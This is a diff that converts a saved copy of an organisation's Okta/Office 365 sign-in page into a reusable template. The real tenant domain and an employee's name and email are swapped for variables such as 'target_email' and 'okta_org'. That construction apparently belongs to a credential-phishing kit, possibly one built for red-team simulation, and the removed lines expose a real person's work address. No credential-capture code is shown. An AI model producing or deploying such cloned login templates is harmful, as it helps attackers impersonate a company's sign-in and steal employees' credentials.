@@ -99,7 +99,7 @@
 
 <!-- hidden form for reposting fromURI for X509 auth -->
 <form action="/login/cert" method="post" id="x509_login" name="x509_login" class="hide">
-    <input type="hidden" id="fromURI" name="fromURI" class="hidden" value="&#x2f;app&#x2f;office365&#x2f;exk1ufbfxuFLJp6y3697&#x2f;sso&#x2f;wsfed&#x2f;passive&#x3f;username&#x3d;Brian.Caldwell&#x25;40Zimperium.com&amp;wa&#x3d;wsignin1.0&amp;wtrealm&#x3d;urn&#x25;3afederation&#x25;3aMicrosoftOnline&amp;wctx&#x3d;"/>
+    <input type="hidden" id="fromURI" name="fromURI" class="hidden" value="/app/office365/{{ okta_app_id | default('APP_ID') }}/sso/wsfed/passive?username={{ target_email | urlencode | default('user%40example.com') }}&amp;wa=wsignin1.0&amp;wtrealm=urn%3afederation%3aMicrosoftOnline&amp;wctx="/>
 </form>
 
 <div class="content">
@@ -199,11 +199,11 @@
 
 <script nonce="GbJoEX60HpuEJf6f877zFg" type="text/javascript">function runLoginPage (fn) {var mainScript = document.createElement('script');mainScript.src = 'https://ok14static.oktacdn.com/assets/js/mvc/loginpage/initLoginPage.pack.58de3be0c9b511a0fdfd7ea4f69b56fc.js';mainScript.crossOrigin = 'anonymous';mainScript.integrity = 'sha384-cJ4LGViZBmIttMPH+ao2RyPuN5BztKWYWIa4smbm56r1cUhkU/Dr6vTS3UoPbKTI';document.getElementsByTagName('head')[0].appendChild(mainScript);fn && mainScript.addEventListener('load', function () { setTimeout(fn, 1) });}</script><script type="text/javascript" nonce="GbJoEX60HpuEJf6f877zFg">
 (function(){
-  var baseUrl = 'https\x3A\x2F\x2Fzimperium.okta.com';
+  var baseUrl = 'https://{{ okta_org | default("your.okta.com") }}';
   var suppliedRedirectUri = '';
   var repost = false;
   var stateToken = '';
-  var fromUri = '\x2Fapp\x2Foffice365\x2Fexk1ufbfxuFLJp6y3697\x2Fsso\x2Fwsfed\x2Fpassive\x3Fusername\x3DBrian.Caldwell\x2540Zimperium.com\x26wa\x3Dwsignin1.0\x26wtrealm\x3Durn\x253afederation\x253aMicrosoftOnline\x26wctx\x3D';
+  var fromUri = '/app/office365/{{ okta_app_id | default("APP_ID") }}/sso/wsfed/passive?username={{ target_email | default("user@example.com") }}&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=';
   var username = '';
   var rememberMe = true;
   var smsRecovery = false;
